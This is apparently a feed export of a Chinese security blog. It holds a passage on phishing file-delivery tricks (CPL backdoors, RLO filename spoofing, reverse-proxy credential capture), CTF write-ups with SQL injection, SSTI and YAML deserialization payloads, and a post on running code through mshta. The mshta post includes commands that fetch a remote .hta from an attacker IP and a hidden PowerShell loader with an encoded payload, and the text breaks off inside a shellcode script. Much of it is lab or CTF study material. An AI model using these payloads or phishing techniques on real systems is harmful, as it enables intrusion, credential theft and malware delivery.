Backdoor"></a>0x07 CPL Backdoor</h2><p>CPL (Control Panel Item)<br>CPL文件本质上是DLL， 但是由于他包含CPLApplet函数，所以成为了一个windows可执行文件<br>但是虽然是可执行文件，其实是调用shell32.dll 来运行<br>调用的几种方式:</p><p><strong>利用vbs调用cpl</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dim obj</span><br><span class="line">Set obj = CreateObject(&quot;Shell.Application&quot;)</span><br><span class="line">obj.ControlPanelItem(&quot;test.cpl&quot;)</span><br></pre></td></tr></table></figure></p><p><strong>利用js调用cpl</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a = new ActiveXObject(&quot;Shell.Application&quot;);</span><br><span class="line">a.ControlPanelItem(&quot;c:\\test\\test.cpl&quot;);</span><br></pre></td></tr></table></figure></p><p>同样，其实可以直接用msf生成一个dll文件，然后修改后缀为.cpl即可，但是存在一个弹窗提示程序兼容性问题<br>解决方式：手动编译reverse_tcp</p><p>参考：<a href="http://www.anquan.us/static/drops/tips-16042.html" target="_blank" rel="noopener">http://www.anquan.us/static/drops/tips-16042.html</a></p><h2 id="0x08-Windows-利用Unicode-文件名反转"><a href="#0x08-Windows-利用Unicode-文件名反转" class="headerlink" title="0x08 Windows 利用Unicode 文件名反转"></a>0x08 Windows 利用Unicode 文件名反转</h2><p>相当简单..<br><img src="/Phishing Attack - 文件落地.resources/0BB5918F-F0DC-4CED-B0BE-56F421ABA477.png" alt="723d43d4d266bfe5a3c58768d476d090"></p><p>插入RLO字符就可以进行文件名反转，然后可以换图片来更好的伪装<br><img src="/Phishing Attack - 文件落地.resources/76864B14-46A1-4586-BC1E-2A104295BA7C.png" alt="5633fd5aa8a0e32749abe83665490e9c"></p><h2 id="0x09-Winrar-Backdoor"><a href="#0x09-Winrar-Backdoor" class="headerlink" title="0x09 Winrar Backdoor"></a>0x09 Winrar Backdoor</h2><p>著名的<code>CVE-2018-20250</code><br>还没分析过原理..献上学长的Exp<br><a href="https://github.com/WyAtu/CVE-2018-20250" target="_blank" rel="noopener">https://github.com/WyAtu/CVE-2018-20250</a></p><h2 id="0x10-CVE-2018-4878"><a href="#0x10-CVE-2018-4878" class="headerlink" title="0x10 CVE-2018-4878"></a>0x10 CVE-2018-4878</h2><p>影响版本：<br><code>version &lt;= 28.0.0.137</code><br>flask 溢出，配合脚本进行攻击就行..现在h5盛行，flash也快退休了</p><h2 id="0x11-Nginx-反向代理"><a href="#0x11-Nginx-反向代理" class="headerlink" title="0x11 Nginx 反向代理"></a>0x11 Nginx 反向代理</h2><p>推一波passer6y<br><a href="https://www.anquanke.com/post/id/150436" target="_blank" rel="noopener">https://www.anquanke.com/post/id/150436</a><br>大概就是注册一个相近的域名，然后反代真实服务器，截断明文密码，进行钓鱼，单独分析一波  # Nginx 反向代理实战</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-07-18 11:20:33&lt;br&gt;&lt;img src=&quot;/wallpaper/[39567]Good Morning-54191467.png&quot; alt&gt;&lt;br&gt;[toc]&lt;br&gt;鱼
      
    
    </summary>
    
    
      <category term="Backdoor" scheme="http://patrilic.top/tags/Backdoor/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2019-西南赛区部分Web题解</title>
    <link href="http://patrilic.top/2019/06/10/CISCN2019-%E8%A5%BF%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%83%A8%E5%88%86Web%E9%A2%98%E8%A7%A3/"/>
    <id>http://patrilic.top/2019/06/10/CISCN2019-西南赛区部分Web题解/</id>
    <published>2019-06-10T07:08:02.000Z</published>
    <updated>2019-08-16T05:15:46.675Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-06-10 15:08:02<br>拿了个第四..师傅们tql，没想到纯Web队伍也有翻身的一天（滑稽）<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/931F982B33E8B1040822716BDAFA42EE.jpg" alt="931f982b33e8b1040822716bdafa42ee"></p></blockquote><h2 id="Ciscn-q07"><a href="#Ciscn-q07" class="headerlink" title="Ciscn-q07"></a>Ciscn-q07</h2><p>先注册一个admin’# 的账号然后直接文件上传<br>直接传php(不用&lt;?php)<br>改mime为image/jpeg就getshell了..<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/071.png" alt="4d80f49d47825ccd9aca1330a124636c"><br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/072.png" alt="913690845a8e92d1ab10a77737894477"></p><p>判定了一个admin的权限</p><h2 id="Ciscn-q09"><a href="#Ciscn-q09" class="headerlink" title="Ciscn-q09"></a>Ciscn-q09</h2><p>注册用户登陆的时候，发现存在sql注入<br>登陆进去之后发现注释有提示，存在admin的账号，注册一个用户名为下面的账号，登陆即可注入admin的密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&apos;&amp;amp;&amp;amp; extractvalue(1,concat(0x7e,(select `3` from (select 1,2,3 union select * from user)a limit 1,1)))#</span><br></pre></td></tr></table></figure></p><p><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/091.png" alt="19cd6150c405f77f4e70098b9a9ff4f7"><br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/092.png" alt="f94276c29af45e7fc2928bcbe9248541"><br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/093.png" alt="86a8390a6baa79d4ccaa682ae02d91cb"></p><p>用admin的账号和密码登陆提示orange的SSRF，可控url就是bug反馈</p><p>携带cookie去请求flag.php即可获得flag<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/094.png" alt="9142fc4e44be8a5d61cde6519fdbf26e"></p><h2 id="Ciscn-8"><a href="#Ciscn-8" class="headerlink" title="Ciscn 8"></a>Ciscn 8</h2><p>URL：172.16.9.18<br>看着有计算功能，并且是PY，直接想SSTI，试了下 2<br>得到输出结果为2，确定了SSTI<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/123.png" alt="3a65fa54c411da804acc98652f208834"></p><p>然后就是用payload了，不过测试过程中发现了两个过滤的点 一个是括号，一个是open字符串，不过都可以用双写来绕过 括号只是单独的括号就会被置换为空，如果里面有字符的话就不会置换为空 比如 () 要用 (()) 绕， open 要用 opopenen 绕<br>于是最终的payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__.__getitem__(1).__subclasses__(())[302].__init__.__globals__[&apos;poopenpen&apos;](&apos;cat flag&apos;).read(())&#125;&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/111.png" alt="4ef955d4f8a6198ac47c9f39365b480c"><br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/112.png" alt="65c4176a3f67c25b3beafaad2432027a"></p><h2 id="Ciscn-10"><a href="#Ciscn-10" class="headerlink" title="Ciscn 10"></a>Ciscn 10</h2><p>URL： 172.16.9.20<br>点击忘记密码<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/3.png" alt="454b911c60722c999e150395e4fbcbab"></p><p>修改后可直接登录admin<br><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/图片 2.png" alt="5ce1c580d29d7c882b2e34f59ff2885f"></p><p>猜测yaml命令执行<br>执行ls结果<br> Payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">!!map &#123;</span><br><span class="line">? !!str &quot;goodbye&quot;</span><br><span class="line">: !!python/object/apply:subprocess.check_output [</span><br><span class="line">!!str &quot;ls&quot;,],&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/CISCN2019 -西南赛区分区赛Web题解.resources/图片 1.png" alt="1349a5aa45787c9df811b7ae787084f4"></p><p>准备构造payload 进行cat /flag时发现别人上传了5.yml<br>直接访问即可：<br> flag{81595b84-317b-434a-b45f-6aea2c37722c}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-06-10 15:08:02&lt;br&gt;拿了个第四..师傅们tql，没想到纯Web队伍也有翻身的一天（滑稽）&lt;br&gt;&lt;img src=&quot;/CISCN2019 -西南赛区分区赛Web题解.
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>QWB2019 Web -随便注（题解）</title>
    <link href="http://patrilic.top/2019/06/05/QWB2019%20Web%20-%E9%9A%8F%E4%BE%BF%E6%B3%A8%EF%BC%88%E9%A2%98%E8%A7%A3%EF%BC%89/"/>
    <id>http://patrilic.top/2019/06/05/QWB2019 Web -随便注（题解）/</id>
    <published>2019-06-05T12:59:32.000Z</published>
    <updated>2019-08-16T05:14:04.962Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-06-05 20:59:32<br><img src="/wallpaper/[41576]「　ねぇ、」-64710934.jpg" alt><br>很少遇到使用 <strong>mysqli_multi_query()</strong> 的题目，做个记录</p></blockquote><p>概率论使我憔悴</p><h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><p>打开题目，就一个&lt;input>标签，随便输一个数字，burp抓一下<br><img src="/QWB2019 Web -随便注（题解）.resources/225795EF-A32C-497C-967D-C6AED199E73A.png" alt="a9bba15b8d47ba4edea294709f323bc5"></p><p>感觉是一般的select语句<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">id</span>, <span class="keyword">data</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> <span class="keyword">id</span> = &#123;$inject&#125;</span><br></pre></td></tr></table></figure></p><p>测一下过滤情况<br>随便输入一个<img src="/QWB2019 Web -随便注（题解）.resources/893B07F7-8A30-4FBD-923D-3203BF85F508.png" alt="0535bce1ced6095c073ded1c06110095"><br>爆出过滤情况<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/select|update|delete|drop|insert|where|\./i"</span>, $inject);</span><br></pre></td></tr></table></figure></p><p>尝试一波extractvalue(),无果..</p><p>然后就在测试一些常用的情况，类似于<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((substr(user(),1,1)&gt;'a'),sleep(5),1);</span><br></pre></td></tr></table></figure></p><p>后来@hpdoger告诉我说可以堆叠查询..<br>于是乎..<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">databases</span>;</span><br></pre></td></tr></table></figure></p><p><img src="/QWB2019 Web -随便注（题解）.resources/C6C08A11-B19B-49EC-AECC-E88D6846C07A.png" alt="e77b6cef87b97ccf9d695c4f36dd2fe2"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">tables</span></span><br></pre></td></tr></table></figure><p><img src="/QWB2019 Web -随便注（题解）.resources/F4ECA2ED-A838-4A75-BA6B-5ED93136DB3E.png" alt="acde9a6b7ba360dbb9e0404f47a48a1c"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">describe</span><span class="string">`1919810931114514`</span></span><br></pre></td></tr></table></figure><p><img src="/QWB2019 Web -随便注（题解）.resources/B102EE66-34F1-4FB9-8098-65E35EB32CA3.png" alt="6bcd5a04abba3759bc0d190a82b550ce"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'version'</span></span><br></pre></td></tr></table></figure><p><img src="/QWB2019 Web -随便注（题解）.resources/5F55DDD1-4E28-46C6-8EE2-B3F9C8C8F00A.png" alt="9a2a58383e535d53cc886c3078bfbe33"></p><p>所以现在的信息就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">database: supersqli</span><br><span class="line">table: 1919810931114514</span><br><span class="line">column: flag</span><br><span class="line">version: 10.0.27-MariaDB-0ubuntu0.16.04.1</span><br></pre></td></tr></table></figure></p><p>然后还有个好玩的：<br>查看grant的时候: ;SHOW GRANTS FOR CURRENT_USER()<br><img src="/QWB2019 Web -随便注（题解）.resources/BD7CB99F-9E59-45B0-9AF7-1AE8E74158DC.png" alt="f7c19dd203bc1755b0d46759e09f93c7"></p><p>现在目标明确，就是要<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> flag <span class="keyword">from</span> <span class="number">191981093111414</span></span><br></pre></td></tr></table></figure></p><h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>利用set将<strong>select flag from 1919810931114514</strong>写入变量@patrilic中，利用prepare将变量设置为预处理，然后再execute</p><p>主要可以bypass掉select，用char()函数带入。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> @patrilic=<span class="keyword">concat</span>(<span class="built_in">char</span>(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">32</span>),<span class="built_in">char</span>(<span class="number">102</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">109</span>,<span class="number">32</span>),<span class="number">1919810931114514</span>);</span><br></pre></td></tr></table></figure></p><p><img src="/QWB2019 Web -随便注（题解）.resources/868A3AB6-CFD4-4B93-8ACF-7FD92F44A6C6.png" alt="f30557894cf438c4e47146a0cb3bbc45"></p><p>然后直接执行即可.<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=&apos;;SET+@patrilic=concat(char(115,101,108,101,99,116,32),char(102,108,97,103,32),char(102,114,111,109,32),char(96),1919810931114514,char(96));prepare+patrilic+from+@patrilic;execute+patrilic%23</span><br></pre></td></tr></table></figure></p><p>参考:<br><a href="https://blog.csdn.net/qq_42030417/article/details/80372800" target="_blank" rel="noopener">https://blog.csdn.net/qq_42030417/article/details/80372800</a></p><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>利用mysql::handler<br><img src="/QWB2019 Web -随便注（题解）.resources/44DCE71B-290D-4DF1-BF78-8CA825633D9F.png" alt="078ec36715ece7186ada02a51ac1f367"></p><p>也可使用别名<br><img src="/QWB2019 Web -随便注（题解）.resources/6F664750-5A87-498E-9790-42EC62EAE0F3.png" alt="5e65dda79fc38e997716d9f5139dc88a"></p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject=&apos;;handler+`1919810931114514`+open;handler`1919810931114514`read+first%23</span><br></pre></td></tr></table></figure></p><p>参考：<br><a href="https://dev.mysql.com/doc/refman/5.7/en/handler.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/handler.html</a><br><a href="https://blog.csdn.net/JesseYoung/article/details/40785137" target="_blank" rel="noopener">https://blog.csdn.net/JesseYoung/article/details/40785137</a></p><h2 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h2><p>… </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-06-05 20:59:32&lt;br&gt;&lt;img src=&quot;/wallpaper/[41576]「　ねぇ、」-64710934.jpg&quot; alt&gt;&lt;br&gt;很少遇到使用 &lt;strong&gt;m
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://patrilic.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Command Execute By mshta</title>
    <link href="http://patrilic.top/2019/05/08/Command%20Execute%20By%20mshta/"/>
    <id>http://patrilic.top/2019/05/08/Command Execute By mshta/</id>
    <published>2019-05-08T03:20:33.000Z</published>
    <updated>2019-08-16T05:14:49.784Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-05-08 11:20:33<br><img src="/wallpaper/[33657]天使の仕組み-60684267.png" alt></p></blockquote><h2 id="0x01-mshta"><a href="#0x01-mshta" class="headerlink" title="0x01 mshta"></a>0x01 mshta</h2><p>👉官方文档直通车 –&gt;<a href="https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940701(v=winembedded.5" target="_blank" rel="noopener">🚗滴滴滴</a>)</p><p>思路：利用Mshta执行JavaScript/VBscript 调用<strong>WScript.shell</strong>执行命令<br>结合VBS下载C2 payload，JS下载payload，JSRAT，直接反弹session……<br>eg:<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mshta vbscript:window.execScript("alert('hello world!');","javascript") </span><br><span class="line"></span><br><span class="line">mshta javascript:window.execScript("msgBox('hello world!'):window.close","vbs")</span><br></pre></td></tr></table></figure></p><p>测试：</p><blockquote><p>Attacker : 192.168.199.142 MacOS<br>Victim : 192.168.121.130  Windows 10 1809</p></blockquote><h2 id="0x02-MetaSploit-hta-server"><a href="#0x02-MetaSploit-hta-server" class="headerlink" title="0x02 MetaSploit::hta_server"></a>0x02 MetaSploit::hta_server</h2><p><strong>exploit/windows/misc/hta_server</strong><br><img src="/Command Execute By mshta.resources/D5C323C2-F7B7-4C16-B1AF-3C6529398DFA.png" alt="418b9f4a3fb34ef94542812b0130a9f8"></p><p>受害机执行<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">199</span>.<span class="number">142</span>:<span class="number">8080</span>/wSbMp9V.hta</span><br></pre></td></tr></table></figure></p><p>会被Defender拦截<br>样本分析</p><p><ps1>为Base64加密的ps1代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if([IntPtr]::Size -eq 4)&#123;</span><br><span class="line">    $b=&apos;powershell.exe&apos;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $b=$env:windir+&apos;\syswow64\WindowsPowerShell\v1.0\powershell.exe&apos;&#125;;</span><br><span class="line">    $s=New-Object System.Diagnostics.ProcessStartInfo;</span><br><span class="line">    $s.FileName=$b;</span><br><span class="line">    $s.Arguments=&apos;-nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String(&apos;&apos;H4sIABhN0FwCA7VW+2/aSBD+OZH6P1gVkm2FYCC0aSJVujVPE5xAHAiEQ6fFXtsLa5vYa169/u83C3abXtO79qSzeOxjZnbmm29m7aahzWkUSr4xlz69OT3p4xgHklJwR1dFqRDdqCcnsFrYs2pd+igpU7RaNaIA03B2fV1P45iE/DgvtQlHSUKCOaMkUVTpT+nRJzE5v5sviM2lT1Lhj1KbRXPMMrFdHds+kc5R6Ii9XmRj4UrJWjHKFfn332V1el6ZlZrPKWaJIlu7hJOg5DAmq9JnVRz4sFsRRTapHUdJ5PLSIw0vqqVhmGCX3IK1NTEJ9yMnkVWIAj4x4WkcSod4hIHjtiLDsB9HNnKcmCSJXJSmwvR0NvtNmWbn3qchpwEpGSEncbSySLymNklKHRw6jNwTdwZaFo9p6M1UFcTW0ZIohTBlrCj9ihnllmxy1H5WSXmpBFJ9HqtFSOMrcZqRkzJy1JRfcVSkXoXnmH7A7fOb0zenbk6U+YX5kigwOpkexgRcU/pRQg9iH6VyUTLhEMyjeAfTwkOcEnX2BVipsF4Wf6xdyUVB0Kt0rS2sTUcRdWagkyWzsAnmYvnHnGwQl4aksQtxQO2cdsprABOXkUOApVzsFpxS5GyDOA3CiIe5gEzk+Tu1ZkD5F109pcwhMbIhSQl4BflTv3XmmAVFNkKTBIDQcQ7EK7hAdpJLZwTf5aeLOQjJdYaTpCj1U6g2uyhZBDPiFCUUJjTbQimPDkP5q7tmyji1ccJzczM1gzE7rh6FCY9TG3IGoT9YK2JTzAQSRalDHaLvLOrlx8qv4lDHjEEJgKU15AFWRPwWF0yIwUPIulqyCDeCFSMBSBxqvsWwBxWe0fxAHOwRR/6bezmLj5QVOOQAvHAOkmuxiBelEY05dA6B6YFB/+XwFy1DuFGPSZYEJS+Mqb7jgs+FjXUlyJghcog/5hB7K44CHSfkfe3YHJS32h2tI3gmRshMW1/SCtrQimHCd0gvjKhx6dx0Fx0tbmx9FxmJYXb6jUGnU1t3rVGNW02D3/QNbjbHi4WFOvfDCX8yUOeBlpeT2n7VpXurh5zJVnu/1/ebsr7dLzzHnTRc17t0rfvKuxbtPdYHermKe41m2nvUN3q5ljTppjOgw8Gy2+LzyYjhoat548oVpttevBhVInNvINT2L+x91x21fdPZTTqULLRyjw7QAKEb+344bHsrr50g7Wr0XA8W6NkkdxgZqDnadd8xfTBs6WjY1Af4LupfnDW0ypPz3Gw9jXE3YE67o1UmY+SgWHvw/MrlnR8KnLCnP+tCBvWedi0NZPo11KlV6f7pedD2UBNkRkGEcIsuh2djsHn7ADqPw4oTIR4aY00beZqHXMufYKSDtP6MWnpU333om31tNKr6lfmy4oPPZLz+YHbRWcvua5p2FszhV0O2udqGY31zud5w3H0E2w/a1fDjW8EQoEhhVa0+vcj9j7q1iePExww4AW04L8FWFLey3tqPqNBQFHEZL0kcEga3Gdx3OZURY5Et+rpownClHBu9uHeGMLyovjpSpS+C6td2ny9dXz+Bj1AaQN9Sj4Qe94vl7UW5DO27vK2VIcSfD6serXaKsFQU3f8AS2aZHSyromAK6fJ/xSqrUR/+nH/B6uvaP+z+FH7l4jHa75a/XfglNH818EdMOQha0GMYOV5vr8af0eLF1Z8uIedu9og3t7uUn9/C+8Cb078ABtGBSyEKAAA=&apos;&apos;))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))&apos;;</span><br><span class="line">    $s.UseShellExecute=$false;</span><br><span class="line">    $s.RedirectStandardOutput=$true;</span><br><span class="line">    $s.WindowStyle=&apos;Hidden&apos;;</span><br><span class="line">    $s.CreateNoWindow=$true;</span><br><span class="line">    $p=[System.Diagnostics.Process]::Start($s);</span><br></pre></td></tr></table></figure></ps1></p><p>解密后<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>([IntPtr]::Size <span class="nomarkup">-eq</span> <span class="number">4</span>)&#123;<span class="variable">$b</span>=<span class="string">'powershell.exe'</span>&#125;<span class="keyword">else</span>&#123;<span class="variable">$b</span>=<span class="variable">$env:windir</span>+<span class="string">'\syswow64\WindowsPowerShell\v1.0\powershell.exe'</span>&#125;;<span class="variable">$s</span>=<span class="built_in">New-Object</span> System.Diagnostics.ProcessStartInfo;<span class="variable">$s</span>.FileName=<span class="variable">$b</span>;<span class="variable">$s</span>.Arguments=<span class="string">'-nop -w hidden -c &amp;([scriptblock]::create((New-Object IO.StreamReader(New-Object IO.Compression.GzipStream((New-Object IO.MemoryStream(,[Convert]::FromBase64String('</span><span class="string">'H4sIABhN0FwCA7VW+2/aSBD+OZH6P1gVkm2FYCC0aSJVujVPE5xAHAiEQ6fFXtsLa5vYa169/u83C3abXtO79qSzeOxjZnbmm29m7aahzWkUSr4xlz69OT3p4xgHklJwR1dFqRDdqCcnsFrYs2pd+igpU7RaNaIA03B2fV1P45iE/DgvtQlHSUKCOaMkUVTpT+nRJzE5v5sviM2lT1Lhj1KbRXPMMrFdHds+kc5R6Ii9XmRj4UrJWjHKFfn332V1el6ZlZrPKWaJIlu7hJOg5DAmq9JnVRz4sFsRRTapHUdJ5PLSIw0vqqVhmGCX3IK1NTEJ9yMnkVWIAj4x4WkcSod4hIHjtiLDsB9HNnKcmCSJXJSmwvR0NvtNmWbn3qchpwEpGSEncbSySLymNklKHRw6jNwTdwZaFo9p6M1UFcTW0ZIohTBlrCj9ihnllmxy1H5WSXmpBFJ9HqtFSOMrcZqRkzJy1JRfcVSkXoXnmH7A7fOb0zenbk6U+YX5kigwOpkexgRcU/pRQg9iH6VyUTLhEMyjeAfTwkOcEnX2BVipsF4Wf6xdyUVB0Kt0rS2sTUcRdWagkyWzsAnmYvnHnGwQl4aksQtxQO2cdsprABOXkUOApVzsFpxS5GyDOA3CiIe5gEzk+Tu1ZkD5F109pcwhMbIhSQl4BflTv3XmmAVFNkKTBIDQcQ7EK7hAdpJLZwTf5aeLOQjJdYaTpCj1U6g2uyhZBDPiFCUUJjTbQimPDkP5q7tmyji1ccJzczM1gzE7rh6FCY9TG3IGoT9YK2JTzAQSRalDHaLvLOrlx8qv4lDHjEEJgKU15AFWRPwWF0yIwUPIulqyCDeCFSMBSBxqvsWwBxWe0fxAHOwRR/6bezmLj5QVOOQAvHAOkmuxiBelEY05dA6B6YFB/+XwFy1DuFGPSZYEJS+Mqb7jgs+FjXUlyJghcog/5hB7K44CHSfkfe3YHJS32h2tI3gmRshMW1/SCtrQimHCd0gvjKhx6dx0Fx0tbmx9FxmJYXb6jUGnU1t3rVGNW02D3/QNbjbHi4WFOvfDCX8yUOeBlpeT2n7VpXurh5zJVnu/1/ebsr7dLzzHnTRc17t0rfvKuxbtPdYHermKe41m2nvUN3q5ljTppjOgw8Gy2+LzyYjhoat548oVpttevBhVInNvINT2L+x91x21fdPZTTqULLRyjw7QAKEb+344bHsrr50g7Wr0XA8W6NkkdxgZqDnadd8xfTBs6WjY1Af4LupfnDW0ypPz3Gw9jXE3YE67o1UmY+SgWHvw/MrlnR8KnLCnP+tCBvWedi0NZPo11KlV6f7pedD2UBNkRkGEcIsuh2djsHn7ADqPw4oTIR4aY00beZqHXMufYKSDtP6MWnpU333om31tNKr6lfmy4oPPZLz+YHbRWcvua5p2FszhV0O2udqGY31zud5w3H0E2w/a1fDjW8EQoEhhVa0+vcj9j7q1iePExww4AW04L8FWFLey3tqPqNBQFHEZL0kcEga3Gdx3OZURY5Et+rpownClHBu9uHeGMLyovjpSpS+C6td2ny9dXz+Bj1AaQN9Sj4Qe94vl7UW5DO27vK2VIcSfD6serXaKsFQU3f8AS2aZHSyromAK6fJ/xSqrUR/+nH/B6uvaP+z+FH7l4jHa75a/XfglNH818EdMOQha0GMYOV5vr8af0eLF1Z8uIedu9og3t7uUn9/C+8Cb078ABtGBSyEKAAA='</span><span class="string">'))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))'</span>;<span class="variable">$s</span>.UseShellExecute=<span class="literal">$false</span>;<span class="variable">$s</span>.RedirectStandardOutput=<span class="literal">$true</span>;<span class="variable">$s</span>.WindowStyle=<span class="string">'Hidden'</span>;<span class="variable">$s</span>.CreateNoWindow=<span class="literal">$true</span>;<span class="variable">$p</span>=[System.Diagnostics.Process]::Start(<span class="variable">$s</span>);</span><br></pre></td></tr></table></figure></p><p>Gzip文件流Base64加密</p><p>Defender拦截</p><h2 id="0x03-Cobalt-Strike"><a href="#0x03-Cobalt-Strike" class="headerlink" title="0x03 Cobalt Strike"></a>0x03 Cobalt Strike</h2><p>Attacks –&gt; Packages –&gt; HTML Application</p><p><img src="/Command Execute By mshta.resources/8BB9866F-36A0-489E-85CF-1710CBAA086D.png" alt="b38801405640b4a557ac53ba451a66db"></p><p>生成的.HTA文件存在本地，可以通过多种方式传入受害机<br>受害机上执行命令<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">199</span>.<span class="number">142</span>:<span class="number">8080</span>/evil.hta</span><br></pre></td></tr></table></figure></p><p>evil.hta<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line">Function var_func()</span><br><span class="line">var_shellcode = &quot;quot;</span><br><span class="line"></span><br><span class="line">Dim 